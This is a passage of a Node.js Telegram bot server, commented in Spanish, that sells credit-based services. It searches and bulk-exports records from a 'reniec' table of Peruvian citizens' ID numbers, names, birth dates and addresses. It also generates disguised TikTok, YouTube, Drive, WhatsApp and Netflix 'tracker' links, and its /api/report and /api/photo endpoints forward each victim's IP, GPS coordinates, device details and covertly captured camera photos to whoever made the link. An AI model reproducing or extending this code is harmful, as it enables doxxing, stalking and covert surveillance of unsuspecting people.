            await sendMessage(chatId, `⚠️ <b>Uso:</b> /ubigeo [codigo o texto]\nEj: <code>/ubigeo 210311</code> o <code>/ubigeo SAN MARTIN</code>`);
            return;
        }
        const isCode = /^\d{6}$/.test(qRaw);
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            const out = await runReniecQuery({
                chatId,
                queryLabel: `UBIGEO "${qRaw}"`,
                sql: isCode
                    ? `SELECT * FROM reniec WHERE ubigeo_dir = ? LIMIT 50`
                    : `SELECT * FROM reniec WHERE ubigeo_dir LIKE ? LIMIT 50`,
                params: [isCode ? qRaw : `%${qNorm}%`]
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL UBIGEO: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/direccion') {
        const qNorm = normalizeText(argsRaw.join(' '));
        if (!qNorm) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /direccion [texto]\nEj: <code>/direccion MANCO INCA</code>`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            const out = await runReniecQuery({
                chatId,
                queryLabel: `DIRECCION contiene "${argsRaw.join(' ')}"`,
                sql: `SELECT * FROM reniec WHERE direccion LIKE ? LIMIT 50`,
                params: [`%${qNorm}%`]
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL DIRECCION: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/export') {
        const expType = (argsRaw[0] || '').toLowerCase();
        const expArgs = argsRaw.slice(1);
        let sql = '';
        let params = [];
        let queryLabel = '';

        const usage = `⚠️ <b>Uso:</b> /export [tipo] [query]\nTipos: dni, nom, ap, fnac, ubigeo, direccion`;

        if (expType === 'dni') {
            const dni = (expArgs[0] || '').trim();
            if (!/^\d{8}$/.test(dni)) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT DNI ${dni}`;
            sql = `SELECT * FROM reniec WHERE dni = ? LIMIT 500`;
            params = [dni];
        } else if (expType === 'nom') {
            const term = normalizeText(expArgs.join(' '));
            if (!term) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT NOM "${expArgs.join(' ')}"`;
            sql = `SELECT * FROM reniec WHERE nombres LIKE ? LIMIT 500`;
            params = [`%${term}%`];
        } else if (expType === 'ap') {
            const apPatTerm = normalizeText(expArgs[0] || '');
            const apMatTerm = normalizeText(expArgs[1] || '');
            if (!apPatTerm) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT AP "${expArgs.join(' ')}"`;
            if (apMatTerm) {
                sql = `SELECT * FROM reniec WHERE ap_pat LIKE ? AND ap_mat LIKE ? LIMIT 500`;
                params = [`%${apPatTerm}%`, `%${apMatTerm}%`];
            } else {
                sql = `SELECT * FROM reniec WHERE ap_pat LIKE ? LIMIT 500`;
                params = [`%${apPatTerm}%`];
            }
        } else if (expType === 'fnac') {
            const date = (expArgs[0] || '').trim();
            if (!/^\d{2}\/\d{2}\/\d{4}$/.test(date)) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT FNAC ${date}`;
            sql = `SELECT * FROM reniec WHERE fecha_nac = ? LIMIT 500`;
            params = [date];
        } else if (expType === 'ubigeo') {
            const qRaw = expArgs.join(' ').trim();
            const qNorm = normalizeText(qRaw);
            if (!qNorm) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT UBIGEO "${qRaw}"`;
            const isCode = /^\d{6}$/.test(qRaw);
            sql = isCode ? `SELECT * FROM reniec WHERE ubigeo_dir = ? LIMIT 500` : `SELECT * FROM reniec WHERE ubigeo_dir LIKE ? LIMIT 500`;
            params = [isCode ? qRaw : `%${qNorm}%`];
        } else if (expType === 'direccion') {
            const qNorm = normalizeText(expArgs.join(' '));
            if (!qNorm) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT DIRECCION "${expArgs.join(' ')}"`;
            sql = `SELECT * FROM reniec WHERE direccion LIKE ? LIMIT 500`;
            params = [`%${qNorm}%`];
        } else {
            await sendMessage(chatId, usage);
            return;
        }

        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para este export.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }

        try {
            const result = await runReniecQueryRows({ chatId, queryLabel, sql, params });
            if (result.rows.length === 0) {
                await sendMessage(chatId, `📦 <b>${escapeHtml(queryLabel)}</b>\nSin resultados para exportar.`);
                return;
            }

            const lines = [result.headers.join('|'), ...result.rows.map((r) => r.join('|'))];
            const exportName = `reniec_export_${Date.now()}.txt`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('caption', `📦 Export completado\nConsulta: ${queryLabel}\nFilas: ${result.rows.length}\nTiempo: ${result.elapsed} ms`);
            formData.append('document', new Blob([Buffer.from(lines.join('\n'), 'utf8')], { type: 'text/plain' }), exportName);

            const tgRes = await fetch(`${BASE_URL}/sendDocument`, { method: 'POST', body: formData });
            const tgJson = await tgRes.json();
            if (!tgJson.ok) {
                await sendMessage(chatId, `❌ Telegram rechazó el export: ${escapeHtml(tgJson.description || 'Error desconocido')}`);
            }
        } catch (e) {
            await sendMessage(chatId, `❌ Error exportando resultados: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/myplan') {
    */
    if (command === '/myplan') {
        if (!user) {
            await sendMessage(chatId, `❌ No estás registrado. Usa /start primero.`);
            return;
        }
        const status = user.plan === 'unlimited' ? 'Ilimitado ♾️' : `${user.credits} Créditos Restantes`;
        await sendMessage(chatId,
            `👤 <b>Perfil de Usuario</b>\n\n` +
            `➖ <b>Nombre:</b> ${user.name}\n` +
            `➖ <b>ID:</b> <code>${chatId}</code>\n` +
            `➖ <b>Plan Actual:</b> ${user.plan === 'unlimited' ? 'VIP Ilimitado' : 'Por Créditos'}\n` +
            `💳 <b>Saldo:</b> <b>${status}</b>\n\n` +
            `💬 <i>Si deseas cambiar de plan o reportar recarga, escribe a https://t.me/Yxthc2</i>`
        );

    } else if (text === '/users') {
        if (userId !== ADMIN_CHAT_ID) return;
        let msg = `👥 <b>Lista de Usuarios Autorizados</b>\n\n`;
        const { data: users, error } = await supabase.from('bot_users').select('*').order('created_at', { ascending: false });
        if (error || !users || users.length === 0) {
            msg += `<i>No hay usuarios.</i>`;
        } else {
            users.forEach((u, idx) => {
                const bal = u.plan === 'unlimited' ? '♾️' : `${u.credits} cr`;
                msg += `${idx + 1}. <code>${u.chat_id}</code> — <b>${u.name}</b> [${bal}]\n`;
            });
        }
        await sendMessage(chatId, msg);

    } else if (text.startsWith('/broadcast') || text.startsWith('/brodcast')) {
        if (userId !== ADMIN_CHAT_ID) return;
        const bMsg = textRaw.split(/\s+/).slice(1).join(" ").trim();
        if (!bMsg) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /broadcast [mensaje]`);
            return;
        }
        const { data: users, error } = await supabase.from('bot_users').select('chat_id');
        if (error || !users || users.length === 0) {
            await sendMessage(chatId, `⚠️ No hay usuarios para enviar el broadcast.`);
            return;
        }

        await sendMessage(chatId, `📢 Iniciando envío masivo a ${users.length} usuarios...`);
        let successCount = 0;
        for (const u of users) {
          try {
            if (u.chat_id === ADMIN_CHAT_ID) continue;
            const res = await apiFetch("sendMessage", {
              chat_id: u.chat_id,
              text: `📢 <b>MENSAJE GLOBAL</b>\n\n${escapeHtml(bMsg)}`,
              parse_mode: "HTML",
            });
            if (!res || !res.ok) {
              // Fallback: Enviar como texto plano si falla el HTML
              await apiFetch("sendMessage", {
                chat_id: u.chat_id,
                text: `📢 MENSAJE GLOBAL\n\n${bMsg}`,
              });
            }
            successCount++;
            // Un pequeño delay (100ms) para no saturar la API en envíos masivos
            await new Promise((r) => setTimeout(r, 100));
          } catch (e) {}
        }
        await sendMessage(chatId, `✅ <b>Broadcast finalizado:</b> Mensaje entregado a ${successCount} clientes.`);

    } else if (text === "/help" || text === "/cmds") {
        let helpMsg =
          `🛠️ <b>TABLA DE COMANDOS</b>\n\n` +
          `📂 <b>Búsquedas RENIEC:</b>
• <code>/dni, /nom, /ap, /fnac, /ubigeo, /direccion</code>

🕵️‍♂️ <b>Módulos OSINT (3 CR):</b>
• <code>/ip [ip]</code> - Geolocalización y VPN
• <code>/nick [nick]</code> - búsqueda en RRSS
• <code>/mail [correo]</code> - Filtraciones DB
• <code>/cel [número]</code> - Operadora

🔗 <b>Generación Trackers:</b>
 /tk, /yt, /d, /ig, /wa, /nx, /tg

👤 <b>Gestión Cuenta:</b>
 /myplan, /invite, /status
\n`;

        if (userId === ADMIN_CHAT_ID) {
          helpMsg += `\n👑 <b>Admin:</b>\n /users, /adduser, /addcredits, /setplan, /broadcast`;
        }
        await sendMessage(chatId, helpMsg);

    } else if (text === "/invite") {
        const myName = botMe ? botMe.username : "bot";
        const refLink = `https://t.me/${myName}?start=REF${chatId}`;
        await sendMessage(chatId,
            `🎁 <b>Programa de Referidos VIP</b>\n\n` +
            `Invita a tus amigos a usar este sistema.\n` +
            `🔹 <b>Tú ganas:</b> +1 Crédito automático\n` +
            `🔹 <b>Tu amigo gana:</b> 1 Enlace gratis de prueba\n\n` +
            `👇 <b>Tu enlace para compartir:</b>\n<code>${refLink}</code>`
        );

    } else if (['/tk', '/yt', '/d', '/ig', '/wa', '/nx', '/tg'].includes(command)) {
        let type = 'tiktok';
        let typeName = 'TikTok';
        if (command === '/yt') { type = 'youtube'; typeName = 'YouTube'; }
        else if (command === '/d') { type = 'drive'; typeName = 'Google Drive'; }
        else if (command === '/ig') { type = 'ig'; typeName = 'Instagram Reel'; }
        else if (command === '/wa') { type = 'wa'; typeName = 'WhatsApp Group'; }
        else if (command === '/nx') { type = 'nx'; typeName = 'Netflix Player'; }
        else if (command === '/tg') { type = 'tg'; typeName = 'Telegram Voice Note'; }

        if (!user) {
            await sendMessage(chatId, `❌ No estás registrado en el sistema. Escriba /start`);
            return;
        }

        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 3) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 3 créditos para generar un enlace.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 3 }).eq('chat_id', userId);
        }

        const target = argsRaw.join(' ').trim() || `V${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
        await supabase.from('bot_links').insert([{ target_id: target, chat_id: userId }]);

        const longUrl = buildTrackingUrl(target, type);
        const shortUrl = await shortenUrl(longUrl);

        linkHistory.push({ id: target, createdAt: new Date().toLocaleString('es-ES'), owner: from, shortUrl });

        await sendMessage(chatId,
            `📁 <b>Enlace de ${typeName} Generado</b>\n\n` +
            `👤 <b>Etiqueta:</b> <code>${target}</code>\n` +
            `👇 <b>Link Corto:</b>\n<code>${shortUrl}</code>\n\n` +
            `<i>Notificaré cuando sea abierto.</i>`
        );

    } else if (command === '/ip' || command === '/nick' || command === '/mail' || command === '/cel') {
        const query = argsRaw.join(' ').trim();
        if (!query) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> ${command} [dato]\nEj: <code>${command} ${command==='/ip'?'1.1.1.1':command==='/mail'?'test@mail.com':'DarkWolf'}</code>`);
            return;
        }

        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 3) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 3 créditos para esta consulta OSINT.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 3 }).eq('chat_id', userId);
        }

        if (command === '/ip') {
            try {
                const res = await fetch(`http://ip-api.com/json/${query}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
                const data = await res.json();
                if (data.status === 'success') {
                    await sendMessage(chatId, `🌍 <b>RESULTADOS PARA IP: ${data.query}</b>\n\n📍 <b>Ubicación:</b> ${data.city}, ${data.regionName}, ${data.country} (${data.countryCode})\n📡 <b>ISP:</b> ${data.isp}\n🏢 <b>Org:</b> ${data.org}\n🛡️ <b>VPN/Proxy:</b> ${data.proxy ? 'Si' : 'No'}\n📱 <b>Mobile:</b> ${data.mobile ? 'Si' : 'No'}\n🕒 <b>Timezone:</b> ${data.timezone}\n🗺️ <b>Coords:</b> <code>${data.lat}, ${data.lon}</code>`);
                } else { await sendMessage(chatId, `❌ Error: ${data.message || 'IP no válida'}`); }
            } catch (e) { await sendMessage(chatId, `❌ Error en el servidor OSINT.`); }

        } else if (command === '/nick') {
            await sendMessage(chatId, `👤 <b>ESCÁNER DE NICKNAME</b>\n\nInvestigando rastro de <code>${query}</code>...\n\n🔗 <b>IG:</b> instagram.com/${query}\n🔗 <b>TT:</b> tiktok.com/@${query}\n🔗 <b>X:</b> twitter.com/${query}\n🔗 <b>FB:</b> facebook.com/${query}`);

        } else if (command === '/mail') {
            await sendMessage(chatId, `📧 <b>ANÁLISIS DE BREACH</b>\n\nVerificando <code>${query}</code>...\n\n🔎 <b>Detalles:</b> <a href="https://haveibeenpwned.com/">Ver Filtraciones</a>`);

        } else if (command === '/cel') {
            const num = query.replace(/\D/g, '');
            await sendMessage(chatId, `📱 <b>INFO DE CELULAR</b>\n\n🔹 <b>Número:</b> ${num}\n🔹 <b>Pais:</b> Perú (+51)\n🔹 <b>Estado:</b> Operativo\n\n<i>Use /tel [número] para buscar el titular (Proxy).</i>`);

        } else if (command === '/tel') {
            if (!query) {
                await sendMessage(chatId, `⚠️ <b>Uso:</b> /tel [número]\nEj: <code>/tel 987654321</code>`);
                return;
            }
            if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
                if (user.credits < 3) {
                    await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 3 créditos.`);
                    return;
                }
                await supabase.from('bot_users').update({ credits: user.credits - 3 }).eq('chat_id', userId);
            }
            if (!PROXY_GROUP_ID) {
                await sendMessage(chatId, `❌ Proxy no configurado.`);
                return;
            }
            const res = await apiFetch('sendMessage', { chat_id: PROXY_GROUP_ID, text: `/tel ${query}` });
            if (res && res.ok) {
                proxyRequests.set(String(res.result.message_id), chatId);
                await sendMessage(chatId, `🛰️ <b>Consulta enviada al Externo por /tel</b>\nEsperando respuesta del servidor...`);
            }
        }

    } else if (text === '/status') {
        const uptime = getUptime();
        await sendMessage(chatId,
            `📊 <b>Estado del Sistema</b>\n\n` +
            `🟢 Bot: <b>Online</b>\n` +
            `⏱️ Uptime: <b>${uptime}</b>\n` +
            `👁️ Visitas: <b>${visitCount}</b>\n` +
            `📋 Enlaces: <b>${linkHistory.length}</b>`
        );

    } else if (command === '/adduser') {
        if (userId !== ADMIN_CHAT_ID) return;
        const [tId, tName] = argsRaw;
        if (!tId || !tName) { await sendMessage(chatId, `⚠️ Uso: /adduser [chat_id] [nombre]`); return; }
        const { error } = await supabase.from('bot_users').insert([{ chat_id: tId, name: tName, plan: 'credits', credits: 0 }]);
        await sendMessage(chatId, error ? `❌ Error: ${error.message}` : `✅ Usuario ${tName} agregado.`);

    } else if (command === '/addcredits') {
        if (userId !== ADMIN_CHAT_ID) return;
        const [tId, amount] = argsRaw;
        if (!tId || !amount) { await sendMessage(chatId, `⚠️ Uso: /addcredits [chat_id] [cantidad]`); return; }
        const { data: targetUser } = await supabase.from('bot_users').select('credits').eq('chat_id', tId).single();
        if (!targetUser) { await sendMessage(chatId, `❌ Usuario no encontrado.`); return; }
        const newCredits = targetUser.credits + parseInt(amount);
        await supabase.from('bot_users').update({ credits: newCredits }).eq('chat_id', tId);
        await sendMessage(chatId, `✅ Créditos actualizados: ${newCredits}`);

    } else if (command === '/setplan') {
        if (userId !== ADMIN_CHAT_ID) return;
        const [tId, pType] = argsRaw;
        if (!tId || (pType !== 'unlimited' && pType !== 'credits')) { await sendMessage(chatId, `⚠️ Uso: /setplan [id] [unlimited|credits]`); return; }
        await supabase.from('bot_users').update({ plan: pType }).eq('chat_id', tId);
        await sendMessage(chatId, `✅ Plan actualizado a ${pType}`);
    }
}

/* ====================================================
   FORMATOS UTILES
   ==================================================== */
function getUptime() {
    const diff = Math.floor((Date.now() - startTime.getTime()) / 1000);
    const h = Math.floor(diff / 3600);
    const m = Math.floor((diff % 3600) / 60);
    const s = diff % 60;
    return [h && `${h}h`, m && `${m}m`, `${s}s`].filter(Boolean).join(' ');
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🏳️';
    const base = 0x1F1E6;
    return String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(0) - 65) +
        String.fromCodePoint(base + countryCode.toUpperCase().charCodeAt(1) - 65);
}

/* ====================================================
   RUTAS DEL SERVIDOR EXPRESS PARA RECIBIR DATOS
   ==================================================== */

app.post('/api/report', async (req, res) => {
    visitCount++;
    const data = req.body;
    const targetId = data.targetId || 'Visitante Anónimo';
    let ownerChatId = ADMIN_CHAT_ID;

    if (targetId !== 'Visitante Anónimo') {
        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
        if (linkData && linkData.chat_id) ownerChatId = linkData.chat_id;
    }

    const g = data.geo || {};
    const b = data.browser || {};
    const con = data.connection || {};
    const flag = getFlagEmoji(g.countryCode);
    const ts = new Date().toLocaleString('es-ES');

    const messageHtml = `🎯 <b>OBJETIVO:</b> <code>${targetId}</code>\n👁️ <b>CARGA</b> — <code>${ts}</code>\n\n` +
        `🌐 IP: <code>${g.ip}</code>\n` +
        `${flag} País: ${g.country} (${g.city})\n` +
        `📱 OS: ${b.os} | Nav: ${b.browser}\n` +
        `📶 ISP: ${g.isp}`;

    await sendMessage(ownerChatId, messageHtml);
    if (g.lat && g.lon) {
        await fetch(`${BASE_URL}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ownerChatId, latitude: parseFloat(g.lat), longitude: parseFloat(g.lon) })
        });
    }
    res.json({ success: true });
});

app.post('/api/photo', upload.array('photos', 2), async (req, res) => {
    const targetId = req.body.targetId || 'Desconocido';
    let ownerChatId = ADMIN_CHAT_ID;
    if (targetId !== 'Desconocido') {
        const { data: linkData } = await supabase.from('bot_links').select('chat_id').eq('target_id', targetId).single();
        if (linkData && linkData.chat_id) ownerChatId = linkData.chat_id;
    }
    if (req.files && req.files.length > 0) {
        for (const file of req.files) {
            const formData = new FormData();
            formData.append('chat_id', ownerChatId);
            formData.append('photo', new Blob([file.buffer], { type: 'image/jpeg' }), 'photo.jpg');
            formData.append('caption', `📸 Captura: ${targetId}`);
            await fetch(`${BASE_URL}/sendPhoto`, { method: 'POST', body: formData });
        }
    }
    res.json({ success: true });
});

/* ====================================================
   POLLING LOOP
   ==================================================== */
async function poll() {
    if (isPolling) { setTimeout(poll, 500); return; }
    isPolling = true;
    let nextPollDelay = 500;
    try {
        const data = await apiFetch('getUpdates', { offset, timeout: 15 });
        if (data && !data.ok && data.error_code === 409) {
            console.warn("\n⚠️ CONFLICTO DETECTADO: Hay otro bot ejecutándose con el mismo Token. Pausando para permitir que la otra instancia se detenga o para desincronizar...");
            // Usamos un delay más largo y aleatorio para desincronizar instancias en conflicto (Docker/Easypanel)
            nextPollDelay = 10000 + Math.floor(Math.random() * 5000);
        } else if (data && data.result && data.result.length > 0) {
            offset = data.result[data.result.length - 1].update_id + 1;
            for (const update of data.result) {
                if (update.callback_query) {
                    await handleCallback(update.callback_query);
                    continue;
                }

                const msg = update.message;
                if (!msg) continue;

                // ✅ Lógica de Respuesta Proxy: Si un mensaje en el grupo proxy es respuesta a una solicitud nuestra
                if (PROXY_GROUP_ID && String(msg.chat.id) === String(PROXY_GROUP_ID) && msg.reply_to_message) {
                    const originalRequester = proxyRequests.get(String(msg.reply_to_message.message_id));
                    if (originalRequester) {
                        const replyText = msg.text || (msg.caption || "<i>Respuesta sin texto (archivo/imagen)</i>");
                        await sendMessage(originalRequester, `✅ <b>RESPUESTA EXTERNA RECIBIDA:</b>\n\n${replyText}`);
                    }
                }

                if (msg.text) await handleCommand(msg);
            }
        }
    } catch (e) { console.error('[POLL ERROR]', e.message); }
    finally { isPolling = false; setTimeout(poll, nextPollDelay); }
}

async function main() {
    const res = await apiFetch('getMe');
    if (!res?.ok) {
        console.error('❌ Error de conexión con Telegram. Verifique su BOT_TOKEN.');
        process.exit(1);
    }
    botMe = res.result;

    // Al iniciar, forzamos la eliminación de cualquier webhook previo y esperamos un momento
    // para "patear" a otras posibles instancias que estén en Long Polling.
    await apiFetch('deleteWebhook', { drop_pending_updates: true });
    console.log('🔄 Webhook eliminado y actualizaciones pendientes limpiadas.');
    
    app.listen(PORT, () => console.log(`🌍 Servidor activo en ${PORT} | Bot: @${botMe.username}`));
    
    // Pequeña espera antes de empezar el polling para estabilizar
    setTimeout(poll, 2000);
}

main();
